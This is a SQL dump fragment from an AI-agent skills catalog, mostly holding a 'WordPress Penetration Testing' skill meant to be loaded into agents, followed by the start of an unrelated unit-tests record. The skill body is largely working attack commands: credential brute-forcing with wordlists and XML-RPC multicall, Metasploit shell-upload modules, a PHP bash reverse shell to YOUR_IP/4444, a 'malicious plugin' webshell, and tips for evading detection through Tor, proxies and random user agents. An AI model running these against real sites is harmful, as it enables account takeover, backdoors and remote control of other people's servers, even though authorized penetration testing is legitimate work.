 Metasploit Framework, Burp Suite","es":"Conduce evaluaciones de seguridad integrales en instalaciones de WordPress, incluyendo enumeración de usuarios y plugins","fr":"Effectuez des évaluations de sécurité complètes des installations WordPress, y compris l''énumération des utilisateurs et des plugins","de":"Führen Sie umfassende Sicherheitsbewertungen von WordPress-Installationen durch, einschließlich der Auflistung von Benutzern und Plugins","pt":"Conduza avaliações de segurança abrangentes em instalações WordPress, incluindo enumeração de usuários, temas e plugins","ru":"Проводите комплексные оценки безопасности в установках WordPress, включая перечисление пользователей, тем и плагинов","ar":"إجراء تقييمات أمان شاملة في تثبيتات ووردبريس، بما في ذلك تعداد المستخدمين والسمات والإضافات","en":""},"definition":{"en":""},"features":{"zh":["WPScan","Metasploit Framework","Burp Suite","Nmap","cURL","WordPress"],"ja":["WPScan","Metasploit Framework","Burp Suite","Nmap","cURL","WordPress"],"ko":["WPScan","Metasploit Framework","Burp Suite","Nmap","cURL","WordPress"],"es":["Enumeración de usuarios y plugins","Análisis de vulnerabilidades con WPScan","Ataques de credenciales con Metasploit","Técnicas de explotación de vulnerabilidades","Uso de Burp Suite o OWASP ZAP para pruebas de seguridad","Descubrimiento inicial con Nmap"],"fr":["Énumération des utilisateurs et des plugins","Analyse des vulnérabilités avec WPScan","Attaques de mots de passe avec Metasploit","Téchniques d''exploitation des vulnérabilités","Utilisation de Burp Suite ou OWASP ZAP pour les tests de sécurité","Découverte initiale avec Nmap"],"de":["Auflistung von Benutzern und Plugins","Schwachstellenanalyse mit WPScan","Angriffe auf Zugangsdaten mit Metasploit","Techniken zur Ausnutzung von Schwachstellen","Verwendung von Burp Suite oder OWASP ZAP für Sicherheitstests","Erkennung mit Nmap"],"pt":["Enumeração de usuários e perfis","Análise de temas e plugins","Verificação de vulnerabilidades","Ataques de credenciais","Técnicas de exploração"],"ru":["Перечисление пользователей и профилей","Анализ тем и плагинов","Проверка уязвимостей","Атаки на учетные данные","Методы эксплуатации"],"ar":["تعداد المستخدمين والملفات الشخصية","تحليل السمات والإضافات","فحص الثغرات الأمنية","هجمات على بيانات الاعتماد","أساليب الاستغلال"]},"keywords":{"zh":["WordPress","WPScan","Metasploit Framework","Burp Suite","Nmap","cURL","WordPress","WordPress"],"ja":["WordPress","WPScan","Metasploit Framework","Burp Suite","Nmap","cURL","WordPress","WordPress"],"ko":["WordPress","WPScan","Metasploit Framework","Burp Suite","Nmap","cURL","WordPress","WordPress"],"es":["pruebas de penetración WordPress","seguridad WordPress","WPScan","Metasploit","Burp Suite","OWASP ZAP","Nmap","análisis de vulnerabilidades","ataques de credenciales"],"fr":["test de pénétration WordPress","sécurité WordPress","WPScan","Metasploit","Burp Suite","OWASP ZAP","Nmap","analyse des vulnérabilités","attaques de mots de passe"],"de":["WordPress-PenetrationsTest","WordPress-Sicherheit","WPScan","Metasploit","Burp Suite","OWASP ZAP","Nmap","Schwachstellenanalyse","Angriffe auf Zugangsdaten"],"pt":["teste de penetração wordpress","segurança wordpress","vulnerabilidades wordpress","wpScan","metasploit","burp suite","owasp zap","nmap","curl"],"ru":["тестирование проникновения wordpress","безопасность wordpress","уязвимости wordpress","wpScan","metasploit","burp suite","owasp zap","nmap","curl"],"ar":["اختبار الاختراق في ووردبريس","أمان ووردبريس","ثغرات أمنية في ووردبريس","wpScan","metasploit","burp suite","owasp zap","nmap","curl"]}},"owner":"andre-sugai","repo":"cine-explorer-mvp-block","repoPath":"andre-sugai/cine-explorer-mvp-block","stars":0,"forks":0,"updatedAt":"2026-02-18T01:08:43.475Z","topics":[],"category":"community","skillMd":{"name":"WordPress Penetration Testing","description":"This skill should be used when the user asks to pentest WordPress sites, scan WordPress for vulnerabilities, enumerate WordPress users, themes, or plugins, exploit WordPress vulnerabilities, or use WPScan. It provides comprehensive WordPress security assessment methodologies.","version":"1.1","bodyPreview":"# WordPress Penetration Testing\n\n## Purpose\n\nConduct comprehensive security assessments of WordPress installations including enumeration of users, themes, and plugins, vulnerability scanning, credential attacks, and exploitation techniques. WordPress powers approximately 35% of websites, making it a critical target for security testing.\n\n## Prerequisites\n\n### Required Tools\n- WPScan (pre-installed in Kali Linux)\n- Metasploit Framework\n- Burp Suite or OWASP ZAP\n- Nmap for initial discovery\n- cURL","body":"# WordPress Penetration Testing\n\n## Purpose\n\nConduct comprehensive security assessments of WordPress installations including enumeration of users, themes, and plugins, vulnerability scanning, credential attacks, and exploitation techniques. WordPress powers approximately 35% of websites, making it a critical target for security testing.\n\n## Prerequisites\n\n### Required Tools\n- WPScan (pre-installed in Kali Linux)\n- Metasploit Framework\n- Burp Suite or OWASP ZAP\n- Nmap for initial discovery\n- cURL or wget\n\n### Required Knowledge\n- WordPress architecture and structure\n- Web application testing fundamentals\n- HTTP protocol understanding\n- Common web vulnerabilities (OWASP Top 10)\n\n## Outputs and Deliverables\n\n1. **WordPress Enumeration Report** - Version, themes, plugins, users\n2. **Vulnerability Assessment** - Identified CVEs and misconfigurations\n3. **Credential Assessment** - Weak password findings\n4. **Exploitation Proof** - Shell access documentation\n\n## Core Workflow\n\n### Phase 1: WordPress Discovery\n\nIdentify WordPress installations:\n\n```bash\n# Check for WordPress indicators\ncurl -s http://target.com | grep -i wordpress\ncurl -s http://target.com | grep -i \"wp-content\"\ncurl -s http://target.com | grep -i \"wp-includes\"\n\n# Check common WordPress paths\ncurl -I http://target.com/wp-login.php\ncurl -I http://target.com/wp-admin/\ncurl -I http://target.com/wp-content/\ncurl -I http://target.com/xmlrpc.php\n\n# Check meta generator tag\ncurl -s http://target.com | grep \"generator\"\n\n# Nmap WordPress detection\nnmap -p 80,443 --script http-wordpress-enum target.com\n```\n\nKey WordPress files and directories:\n- `/wp-admin/` - Admin dashboard\n- `/wp-login.php` - Login page\n- `/wp-content/` - Themes, plugins, uploads\n- `/wp-includes/` - Core files\n- `/xmlrpc.php` - XML-RPC interface\n- `/wp-config.php` - Configuration (not accessible if secure)\n- `/readme.html` - Version information\n\n### Phase 2: Basic WPScan Enumeration\n\nComprehensive WordPress scanning with WPScan:\n\n```bash\n# Basic scan\nwpscan --url http://target.com/wordpress/\n\n# With API token (for vulnerability data)\nwpscan --url http://target.com --api-token YOUR_API_TOKEN\n\n# Aggressive detection mode\nwpscan --url http://target.com --detection-mode aggressive\n\n# Output to file\nwpscan --url http://target.com -o results.txt\n\n# JSON output\nwpscan --url http://target.com -f json -o results.json\n\n# Verbose output\nwpscan --url http://target.com -v\n```\n\n### Phase 3: WordPress Version Detection\n\nIdentify WordPress version:\n\n```bash\n# WPScan version detection\nwpscan --url http://target.com\n\n# Manual version checks\ncurl -s http://target.com/readme.html | grep -i version\ncurl -s http://target.com/feed/ | grep -i generator\ncurl -s http://target.com | grep \"?ver=\"\n\n# Check meta generator\ncurl -s http://target.com | grep ''name=\"generator\"''\n\n# Check RSS feeds\ncurl -s http://target.com/feed/\ncurl -s http://target.com/comments/feed/\n```\n\nVersion sources:\n- Meta generator tag in HTML\n- readme.html file\n- RSS/Atom feeds\n- JavaScript/CSS file versions\n\n### Phase 4: Theme Enumeration\n\nIdentify installed themes:\n\n```bash\n# Enumerate all themes\nwpscan --url http://target.com -e at\n\n# Enumerate vulnerable themes only\nwpscan --url http://target.com -e vt\n\n# Theme enumeration with detection mode\nwpscan --url http://target.com -e at --plugins-detection aggressive\n\n# Manual theme detection\ncurl -s http://target.com | grep \"wp-content/themes/\"\ncurl -s http://target.com/wp-content/themes/\n```\n\nTheme vulnerability checks:\n```bash\n# Search for theme exploits\nsearchsploit wordpress theme <theme_name>\n\n# Check theme version\ncurl -s http://target.com/wp-content/themes/<theme>/style.css | grep -i version\ncurl -s http://target.com/wp-content/themes/<theme>/readme.txt\n```\n\n### Phase 5: Plugin Enumeration\n\nIdentify installed plugins:\n\n```bash\n# Enumerate all plugins\nwpscan --url http://target.com -e ap\n\n# Enumerate vulnerable plugins only\nwpscan --url http://target.com -e vp\n\n# Aggressive plugin detection\nwpscan --url http://target.com -e ap --plugins-detection aggressive\n\n# Mixed detection mode\nwpscan --url http://target.com -e ap --plugins-detection mixed\n\n# Manual plugin discovery\ncurl -s http://target.com | grep \"wp-content/plugins/\"\ncurl -s http://target.com/wp-content/plugins/\n```\n\nCommon vulnerable plugins to check:\n```bash\n# Search for plugin exploits\nsearchsploit wordpress plugin <plugin_name>\nsearchsploit wordpress mail-masta\nsearchsploit wordpress slideshow gallery\nsearchsploit wordpress reflex gallery\n\n# Check plugin version\ncurl -s http://target.com/wp-content/plugins/<plugin>/readme.txt\n```\n\n### Phase 6: User Enumeration\n\nDiscover WordPress users:\n\n```bash\n# WPScan user enumeration\nwpscan --url http://target.com -e u\n\n# Enumerate specific number of users\nwpscan --url http://target.com -e u1-100\n\n# Author ID enumeration (manual)\nfor i in {1..20}; do\n    curl -s \"http://target.com/?author=$i\" | grep -o ''author/[^/]*/''\ndone\n\n# JSON API user enumeration (if enabled)\ncurl -s http://target.com/wp-json/wp/v2/users\n\n# REST API user enumeration\ncurl -s http://target.com/wp-json/wp/v2/users?per_page=100\n\n# Login error enumeration\ncurl -X POST -d \"log=admin&pwd=wrongpass\" http://target.com/wp-login.php\n```\n\n### Phase 7: Comprehensive Enumeration\n\nRun all enumeration modules:\n\n```bash\n# Enumerate everything\nwpscan --url http://target.com -e at -e ap -e u\n\n# Alternative comprehensive scan\nwpscan --url http://target.com -e vp,vt,u,cb,dbe\n\n# Enumeration flags:\n# at - All themes\n# vt - Vulnerable themes\n# ap - All plugins\n# vp - Vulnerable plugins\n# u  - Users (1-10)\n# cb - Config backups\n# dbe - Database exports\n\n# Full aggressive enumeration\nwpscan --url http://target.com -e at,ap,u,cb,dbe \\\n    --detection-mode aggressive \\\n    --plugins-detection aggressive\n```\n\n### Phase 8: Password Attacks\n\nBrute-force WordPress credentials:\n\n```bash\n# Single user brute-force\nwpscan --url http://target.com -U admin -P /usr/share/wordlists/rockyou.txt\n\n# Multiple users from file\nwpscan --url http://target.com -U users.txt -P /usr/share/wordlists/rockyou.txt\n\n# With password attack threads\nwpscan --url http://target.com -U admin -P passwords.txt --password-attack wp-login -t 50\n\n# XML-RPC brute-force (faster, may bypass protection)\nwpscan --url http://target.com -U admin -P passwords.txt --password-attack xmlrpc\n\n# Brute-force with API limiting\nwpscan --url http://target.com -U admin -P passwords.txt --throttle 500\n\n# Create targeted wordlist\ncewl http://target.com -w wordlist.txt\nwpscan --url http://target.com -U admin -P wordlist.txt\n```\n\nPassword attack methods:\n- `wp-login` - Standard login form\n- `xmlrpc` - XML-RPC multicall (faster)\n- `xmlrpc-multicall` - Multiple passwords per request\n\n### Phase 9: Vulnerability Exploitation\n\n#### Metasploit Shell Upload\n\nAfter obtaining credentials:\n\n```bash\n# Start Metasploit\nmsfconsole\n\n# Admin shell upload\nuse exploit/unix/webapp/wp_admin_shell_upload\nset RHOSTS target.com\nset USERNAME admin\nset PASSWORD jessica\nset TARGETURI /wordpress\nset LHOST <your_ip>\nexploit\n```\n\n#### Plugin Exploitation\n\n```bash\n# Slideshow Gallery exploit\nuse exploit/unix/webapp/wp_slideshowgallery_upload\nset RHOSTS target.com\nset TARGETURI /wordpress\nset USERNAME admin\nset PASSWORD jessica\nset LHOST <your_ip>\nexploit\n\n# Search for WordPress exploits\nsearch type:exploit platform:php wordpress\n```\n\n#### Manual Exploitation\n\nTheme/plugin editor (with admin access):\n\n```php\n// Navigate to Appearance > Theme Editor\n// Edit 404.php or functions.php\n// Add PHP reverse shell:\n\n<?php\nexec(\"/bin/bash -c ''bash -i >& /dev/tcp/YOUR_IP/4444 0>&1''\");\n?>\n\n// Or use weevely backdoor\n// Access via: http://target.com/wp-content/themes/theme_name/404.php\n```\n\nPlugin upload method:\n\n```bash\n# Create malicious plugin\ncat > malicious.php << ''EOF''\n<?php\n/*\nPlugin Name: Malicious Plugin\nDescription: Security Testing\nVersion: 1.0\n*/\nif(isset($_GET[''cmd''])){\n    system($_GET[''cmd'']);\n}\n?>\nEOF\n\n# Zip and upload via Plugins > Add New > Upload Plugin\nzip malicious.zip malicious.php\n\n# Access webshell\ncurl \"http://target.com/wp-content/plugins/malicious/malicious.php?cmd=id\"\n```\n\n### Phase 10: Advanced Techniques\n\n#### XML-RPC Exploitation\n\n```bash\n# Check if XML-RPC is enabled\ncurl -X POST http://target.com/xmlrpc.php\n\n# List available methods\ncurl -X POST -d ''<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName></methodCall>'' http://target.com/xmlrpc.php\n\n# Brute-force via XML-RPC multicall\ncat > xmlrpc_brute.xml << ''EOF''\n<?xml version=\"1.0\"?>\n<methodCall>\n<methodName>system.multicall</methodName>\n<params>\n<param><value><array><data>\n<value><struct>\n<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>\n<member><name>params</name><value><array><data>\n<value><string>admin</string></value>\n<value><string>password1</string></value>\n</data></array></value></member>\n</struct></value>\n<value><struct>\n<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>\n<member><name>params</name><value><array><data>\n<value><string>admin</string></value>\n<value><string>password2</string></value>\n</data></array></value></member>\n</struct></value>\n</data></array></value></param>\n</params>\n</methodCall>\nEOF\n\ncurl -X POST -d @xmlrpc_brute.xml http://target.com/xmlrpc.php\n```\n\n#### Scanning Through Proxy\n\n```bash\n# Use Tor proxy\nwpscan --url http://target.com --proxy socks5://127.0.0.1:9050\n\n# HTTP proxy\nwpscan --url http://target.com --proxy http://127.0.0.1:8080\n\n# Burp Suite proxy\nwpscan --url http://target.com --proxy http://127.0.0.1:8080 --disable-tls-checks\n```\n\n#### HTTP Authentication\n\n```bash\n# Basic authentication\nwpscan --url http://target.com --http-auth admin:password\n\n# Force SSL/TLS\nwpscan --url https://target.com --disable-tls-checks\n```\n\n## Quick Reference\n\n### WPScan Enumeration Flags\n\n| Flag | Description |\n|------|-------------|\n| `-e at` | All themes |\n| `-e vt` | Vulnerable themes |\n| `-e ap` | All plugins |\n| `-e vp` | Vulnerable plugins |\n| `-e u` | Users (1-10) |\n| `-e cb` | Config backups |\n| `-e dbe` | Database exports |\n\n### Common WordPress Paths\n\n| Path | Purpose |\n|------|---------|\n| `/wp-admin/` | Admin dashboard |\n| `/wp-login.php` | Login page |\n| `/wp-content/uploads/` | User uploads |\n| `/wp-includes/` | Core files |\n| `/xmlrpc.php` | XML-RPC API |\n| `/wp-json/` | REST API |\n\n### WPScan Command Examples\n\n| Purpose | Command |\n|---------|---------|\n| Basic scan | `wpscan --url http://target.com` |\n| All enumeration | `wpscan --url http://target.com -e at,ap,u` |\n| Password attack | `wpscan --url http://target.com -U admin -P pass.txt` |\n| Aggressive | `wpscan --url http://target.com --detection-mode aggressive` |\n\n## Constraints and Limitations\n\n### Legal Considerations\n- Obtain written authorization before testing\n- Stay within defined scope\n- Document all testing activities\n- Follow responsible disclosure\n\n### Technical Limitations\n- WAF may block scanning\n- Rate limiting may prevent brute-force\n- Some plugins may have false negatives\n- XML-RPC may be disabled\n\n### Detection Evasion\n- Use random user agents: `--random-user-agent`\n- Throttle requests: `--throttle 1000`\n- Use proxy rotation\n- Avoid aggressive modes on monitored sites\n\n## Troubleshooting\n\n### WPScan Shows No Vulnerabilities\n\n**Solutions:**\n1. Use API token for vulnerability database\n2. Try aggressive detection mode\n3. Check for WAF blocking scans\n4. Verify WordPress is actually installed\n\n### Brute-Force Blocked\n\n**Solutions:**\n1. Use XML-RPC method instead of wp-login\n2. Add throttling: `--throttle 500`\n3. Use different user agents\n4. Check for IP blocking/fail2ban\n\n### Cannot Access Admin Panel\n\n**Solutions:**\n1. Verify credentials are correct\n2. Check for two-factor authentication\n3. Look for IP whitelist restrictions\n4. Check for login URL changes (security plugins)\n"},"lastSynced":"2026-02-18T09:14:07.807Z","agentAnalysis":{"suitability":{"en":"Ideal for Cybersecurity Agents specializing in web application vulnerability assessment, particularly those utilizing WPScan, Metasploit Framework, and Burp Suite for comprehensive WordPress penetration testing.","zh":"适用于专注于Web应用程序漏洞评估的网络安全代理，特别是那些使用WPScan、Metasploit Framework和Burp Suite进行全面WordPress渗透测试的代理。","ja":"Webアプリケーションの脆弱性評価を専門とするサイバーセキュリティエージェント、特にWPScan、Metasploit Framework、Burp Suiteを使用した包括的なWordPressペネトレーションテストを行うエージェントに最適。","ko":"웹 애플리케이션 취약점 평가에 전문적인 사이버 보안 에이전트, 특히 WPScan, Metasploit Framework 및 Burp Suite를 사용한 포괄적인 워드프레스 침투 테스트를 수행하는 에이전트에게 적합합니다.","es":"Ideal para agentes de ciberseguridad que se especializan en la evaluación de vulnerabilidades de aplicaciones web, particularmente aquellos que utilizan WPScan, Metasploit Framework y Burp Suite para pruebas de penetración de WordPress completas.","fr":"Idéal pour les agents de cybersécurité spécialisés dans l''évaluation des vulnérabilités des applications Web, en particulier ceux qui utilisent WPScan, Metasploit Framework et Burp Suite pour des tests de pénétration WordPress complets.","de":"Ideal für Cyber-Sicherheits-Agenten, die sich auf die Bewertung von Schwachstellen in Webanwendungen spezialisieren, insbesondere solche, die WPScan, Metasploit Framework und Burp Suite für umfassende WordPress-Penetrationstests verwenden.","pt":"Ideal para agentes de cibersegurança especializados em avaliação de vulnerabilidades de aplicativos web, particularmente aqueles que utilizam WPScan, Metasploit Framework e Burp Suite para testes de penetração WordPress abrangentes.","ru":"Идеально подходит для агентов кибербезопасности, специализирующихся на оценке уязвимостей веб-приложений, особенно тех, кто использует WPScan, Metasploit Framework и Burp Suite для всестороннего тестирования на проникновение WordPress.","ar":"مثالي لعميل الأمن السيبراني المتخصص في تقييم نقاط الضعف في تطبيقات الويب، ولا سيما أولئك الذين يستخدمون WPScan و Metasploit Framework و Burp Suite لأداء اختبارات اختراق شاملة لبرنامج WordPress."},"recommendation":{"en":"Empowers agents to conduct thorough security audits of WordPress installations, leveraging tools like Nmap for initial discovery, cURL for request manipulation, and vulnerability scanning to identify potential exploits, thereby enhancing their web application security testing capabilities with enumeration of users, themes, and plugins.","zh":"赋予代理进行WordPress安装的彻底安全审计的能力，利用诸如Nmap的初始发现、cURL的请求操纵和漏洞扫描来识别潜在的漏洞，从而增强他们的Web应用程序安全测试能力，包括用户、主题和插件的枚举。","ja":"エージェントがWordPressのインストールに対する徹底的なセキュリティ監査を実施できるようにし、Nmapによる初期の検出、cURLによるリクエスト操作、脆弱性スキャンを使用して潜在的な脆弱性を特定することで、Webアプリケーションのセキュリティテスト機能を強化します。ユーザー、テーマ、プラグインの列挙を含みます。","ko":"에이전트가 워드프레스 설치에 대한 철저한 보안 감사를 수행할 수 있도록 허용하여 Nmap을 사용한 초기 검색, cURL을 사용한 요청 조작 및 취약점扫描을 사용하여 잠재적인 취약점을 식별하여 웹 애플리케이션 보안 테스트 기능을 향상시킵니다. 사용자, 테마 및 플러그인의 열거를 포함합니다.","es":"Permite a los agentes realizar auditorías de seguridad exhaustivas de las instalaciones de WordPress, aprovechando herramientas como Nmap para el descubrimiento inicial, cURL para la manipulación de solicitudes y el análisis de vulnerabilidades para identificar posibles exploits, mejorando así sus capacidades de prueba de seguridad de aplicaciones web con la enumeración de usuarios, temas y complementos.","fr":"Permet aux agents de réaliser des audits de sécurité complets des installations WordPress, en exploitant des outils tels que Nmap pour la découverte initiale, cURL pour la manipulation des requêtes et l''analyse des vulnérabilités pour identifier les exploits potentiels, améliorant ainsi leurs capacités de test de sécurité des applications Web avec l''énumération des utilisateurs, des thèmes et des plugins.","de":"Ermächtigt Agenten, umfassende Sicherheitsaudits von WordPress-Installationen durchzuführen, indem es Tools wie Nmap für die anfängliche Erkennung, cURL für die Anforderungsmanipulation und die Schwachstellenanalyse zur Identifizierung potenzieller Exploits nutzt, wodurch ihre Fähigkeiten zum Testen der Webanwendungssicherheit durch die Auflistung von Benutzern, Themes und Plugins verbessert werden.","pt":"Habilita os agentes a realizar auditorias de segurança abrangentes das instalações do WordPress, utilizando ferramentas como Nmap para descoberta inicial, cURL para manipulação de solicitações e varredura de vulnerabilidades para identificar possíveis explorações, melhorando assim suas capacidades de teste de segurança de aplicativos web com enumeração de usuários, temas e plugins.","ru":"Наделяет агентов возможностью проводить тщательные аудиты безопасности установок WordPress, используя инструменты như Nmap для первоначального обнаружения, cURL для манипулирования запросами и сканирования уязвимостей для выявления потенциальных уязвимостей, тем самым повышая их возможности тестирования безопасности веб-приложений с перечислением пользователей, тем и плагинов.","ar":"يمنح الوكيل القدرة على إجراء عمليات تدقيق أمنية شاملة للمثباتات التي تم تثبيتها في برنامج WordPress، باستخدام أدوات مثل Nmap للكشف الأولي، و cURL لتعديل الطلبات، وفحص الثغرات الأمنية لتحديد الاستغلال المحتمل، وبالتالي تعزيز قدراتهم لاختبار أمان تطبيقات الويب مع تعداد المستخدمين والموضوعات والإضافات."},"useCases":{"en":["Enumerating WordPress users, themes, and plugins for vulnerability assessment","Conducting credential attacks and exploitation techniques on WordPress sites","Performing comprehensive vulnerability scanning using WPScan and Metasploit Framework"],"zh":["枚举WordPress用户、主题和插件以进行漏洞评估","对WordPress站点进行凭证攻击和利用技术","使用WPScan和Metasploit Framework进行全面漏洞扫描"],"ja":["WordPressのユーザー、テーマ、プラグインを列挙して脆弱性評価を実施する","WordPressサイトに対して資格情報攻撃と利用技術を実施する","WPScanとMetasploit Frameworkを使用して包括的な脆弱性スキャンを実施する"],"ko":["워드프레스 사용자, 테마 및 플러그인을 열거하여 취약점 평가를 수행하는 것","워드프레스 사이트에 대한 자격 증명 공격 및 활용 기술을 수행하는 것","WPScan 및 Metasploit Framework를 사용하여 포괄적인 취약점 스캔을 수행하는 것"],"es":["Enumeración de usuarios, temas y complementos de WordPress para la evaluación de vulnerabilidades","Realización de ataques de credenciales y técnicas de explotación en sitios web de WordPress","Realización de un análisis de vulnerabilidades completo utilizando WPScan y Metasploit Framework"],"fr":["Énumération des utilisateurs, des thèmes et des plugins WordPress pour l''évaluation des vulnérabilités","Réalisations d''attaques de mots de passe et de techniques d''exploitation sur les sites Web WordPress","Réalisations d''un analyse de vulnérabilités complet en utilisant WPScan et Metasploit Framework"],"de":["Auflistung von WordPress-Benutzern, -Themes und -Plugins zur Schwachstellenbewertung","Durchführung von Angriffen auf Anmeldedaten und Ausnutzungstechniken auf WordPress-Websites","Durchführung einer umfassenden Schwachstellenanalyse mit WPScan und Metasploit Framework"],"pt":["Enumerar usuários, temas e plugins do WordPress para avaliação de vulnerabilidades","Realizar ataques de credenciais e técnicas de exploração em sites do WordPress","Realizar varredura de vulnerabilidades abrangente usando WPScan e Metasploit Framework"],"ru":["Перечисление пользователей, тем и плагинов WordPress для оценки уязвимостей","Проведение атак на учетные данные и методов эксплуатации на сайтах WordPress","Проведение всестороннего сканирования уязвимостей с помощью WPScan и Metasploit Framework"],"ar":["تعداد مستخدمي وموضوعات وإضافات برنامج WordPress لتقدير نقاط الضعف","إجراء هجمات على بيانات الاعتماد وتقنيات الاستغلال على مواقع برنامج WordPress","إجراء فحص شامل للثغرات الأمنية باستخدام WPScan و Metasploit Framework"]},"limitations":{"en":["Requires pre-installed tools such as WPScan, Metasploit Framework, Burp Suite or OWASP ZAP, and Nmap","Specifically designed for WordPress installations, limiting its application to other content management systems"],"zh":["需要预先安装的工具，如WPScan、Metasploit Framework、Burp Suite或OWASP ZAP和Nmap","专门为WordPress安装设计，限制了其应用于其他内容管理系统"],"ja":["WPScan、Metasploit Framework、Burp SuiteまたはOWASP ZAP、Nmapなどの事前にインストールされたツールが必要","WordPressのインストール専用に設計されているため、他のコンテンツ管理システムへの適用が制限される"],"ko":["WPScan, Metasploit Framework, Burp Suite 또는 OWASP ZAP 및 Nmap과 같은 사전 설치된 도구가 필요함","워드프레스 설치를 위해 특별히 설계되었으므로, 다른 콘텐츠 관리 시스템에 적용하는 것이 제한됨"],"es":["Requiere herramientas preinstaladas como WPScan, Metasploit Framework, Burp Suite u OWASP ZAP, y Nmap","Está diseñado específicamente para instalaciones de WordPress, lo que limita su aplicación a otros sistemas de gestión de contenido"],"fr":["Nécessite des outils préinstallés tels que WPScan, Metasploit Framework, Burp Suite ou OWASP ZAP, et Nmap","Conçu spécifiquement pour les installations WordPress, ce qui limite son application à d''autres systèmes de gestion de contenu"],"de":["Benötigt vorinstallierte Tools wie WPScan, Metasploit Framework, Burp Suite oder OWASP ZAP und Nmap","Wurde speziell für WordPress-Installationen entwickelt, was seine Anwendung auf andere Content-Management-Systeme einschränkt"],"pt":["Exige ferramentas pré-instaladas, como WPScan, Metasploit Framework, Burp Suite ou OWASP ZAP, e Nmap","Projetado especificamente para instalações do WordPress, limitando sua aplicação a outros sistemas de gerenciamento de conteúdo"],"ru":["Требует предварительно установленных инструментов, таких как WPScan, Metasploit Framework, Burp Suite или OWASP ZAP, и Nmap","Разработан специально для установок WordPress, что ограничивает его применение для других систем управления контентом"],"ar":["يتطلب أدوات مثبتة مسبقًا مثل WPScan و Metasploit Framework و Burp Suite أو OWASP ZAP و Nmap","صمم خصيصًا للمثباتات التي تم تثبيتها في برنامج WordPress، مما يقيد تطبيقه على أنظمة إدارة المحتوى الأخرى"]},"version":3},"qualityScore":75}');
INSERT OR REPLACE INTO skills (id, category, owner, repo, repo_path, name, stars, forks, quality_score, updated_at, last_synced, content_hash, data_json) VALUES ('iulspop/personal-app-template-sqlite-fly-io/unit-tests', 'community', 'iulspop', 'personal-app-template-sqlite-fly-io', 'iulspop/personal-app-template-sqlite-fly-io', 'unit-tests', 0, 0, 20, '2026-02-18T01:08:43.475Z', '2026-02-18T09:14:09.828Z', NULL, '{"id":"iulspop/personal-app-template-sqlite-fly-io/unit-tests","name":"unit-tests","description":{"zh":"作为一名顶级软件工程师，需要具备严格的测试技能，包括编写单元测试以确保代码质量。","ja":"トップレベルのソフトウェアエンジニアとして、コード品質を確保するためのユニットテストの作成などの厳格なテストスキルが必要です。","ko":"최상급 소프트웨어 엔지니어로서 코드 품질을 보장하는 유닛 테스트 작성 등의 엄격한 테스트 기술이 필요합니다.","es":"Las pruebas unitarias son cruciales para garantizar la calidad del software. Aprende a escribir pruebas unitarias efectivas","fr":"Les tests unitaires sont essentiels pour garantir la qualité du logiciel. Découvrez comment écrire des tests unitaires efficaces","de":"Einheitstests sind entscheidend für die Qualität des Software. Lernen Sie, wie man effektive Einheitstests schreibt","pt":"Escreva testes unitários como um engenheiro de software experiente, respondendo a perguntas essenciais sobre o comportamento e saída do código.","ru":"Пишите юнит-тесты как опытный инженер программного обеспечения, отвечая на основные вопросы о поведении и выходе кода.","ar":"اكتب اختبارات وحدة مثل مهندس برمجيات مخضرم، مجيبًا على أسئلة أساسية حول السلوك والإخراج الشفرة.","en":""},"seo":{"title":{"zh":"单元测试技能","ja":"ユニットテストスキル","ko":"유닛 테스트 기술","es":"Pruebas Unitarias","fr":"Tests Unitaires","de":"Einheitliche Tests","pt":"Testes Unitários: Escreva Códigos de Teste Eficientes","ru":"Юнит-тесты: Напишите Эффективные Тестовые Коды","ar":"اختبارات الوحدة: اكتب أكواداً لاختبار فعالة","en":"unit-tests"},"description":{"zh":"作为一名顶级软件工程师，需要具备严格的测试技能，包括编写单元测试以确保代码质量。","ja":"トップレベルのソフトウェアエンジニアとして、コード品質を確保するためのユニットテストの作成などの厳格なテストスキルが必要です。","ko":"최상급 소프트웨어 엔지니어로서 코드 품질을 보장하는 유닛 테스트 작성 등의 엄격한 테스트 기술이 필요합니다.","es":"Las pruebas unitarias son cruciales para garantizar la calidad del software. Aprende a escribir pruebas unitarias efectivas","fr":"Les tests unitaires sont essentiels pour garantir la qualité du logiciel. Découvrez comment écrire des tests unitaires efficaces","de":"Einheitstests sind entscheidend für die Qualität des Software. Lernen Sie, wie man effektive Einheitstests schreibt","pt":"Escreva testes unitários como um engenheiro de software experiente, respondendo a perguntas essenciais sobre o comportamento e saída do código.","ru":"Пишите юнит-тесты как опытный инженер программного обеспечения, отвечая на основные вопросы о поведении и выходе кода.","ar":"اكتب اختبارات وحدة مثل مهندس برمجيات مخضرم، مجيبًا على أسئلة أساسية حول السلوك والإخراج الشفرة.","en":""},"definition":{"en":""},"features":{"zh":["编写高质量的单元测试","确保代码可靠性和稳定性","提高代码可维护性","减少代码缺陷","提高开发效率"],"ja":["高品質のユニットテストの作成","コードの信頼性と安定性の確保","コードの保守性の向上","コードの欠陥の減少","開発効率の向上"],"ko":["고품질의 유닛 테스트 작성","코드의 안정성과 신뢰성 보장","코드의 유지보수성 향상","코드의 결함 감소","개발 효율성 향상"],"es":["Escribir pruebas unitarias efectivas","Validar la funcionalidad de unidades de código","Identificar y solucionar errores","Mejorar la calidad del software","Reducir errores y bugs"],"fr":["Écrire des tests unitaires efficaces","Valider la fonctionnalité d''unités de code","Identifier et résoudre les erreurs","Améliorer la qualité du logiciel","Réduire les erreurs et les bogues"],"de":["Effektive Einheitstests schreiben","Die Funktionalität von Code-Einheiten überprüfen","Fehler identifizieren und beheben","Die Qualität des Software verbessern","Fehler und Bugs reduzieren"],"pt":["Escrita de testes unitários eficientes","Análise de comportamento e saída do código","Identificação de bugs e melhorias","Desenvolvimento de habilidades de teste avançadas","Melhoria da qualidade do código"],"ru":["Написание эффективных юнит-тестов","Анализ поведения и выхода кода","Определение ошибок и улучшений","Развитие продвинутых навыков тестирования","Повышение качества кода"],"ar":["كتابة اختبارات وحدة فعالة","تحليل السلوك والإخراج الشفرة","تحديد الأخطاء والتحسينات","تطوير مهارات اختبار متقدمة","تحسين جودة الشفرة"]},"keywords":{"zh":["单元测试","代码质量","软件工程","测试技能","代码可靠性","代码稳定性"],"ja":["ユニットテスト","コード品質","ソフトウェアエンジニア","テストスキル","コードの信頼性","コードの安定性"],"ko":["유닛 테스트","코드 품질","소프트웨어 엔지니어","테스트 기술","코드의 안정성","코드의 신뢰성"],"es":["pruebas unitarias","testing","ingeniería de software","desarrollo de software","calidad del software","validación de 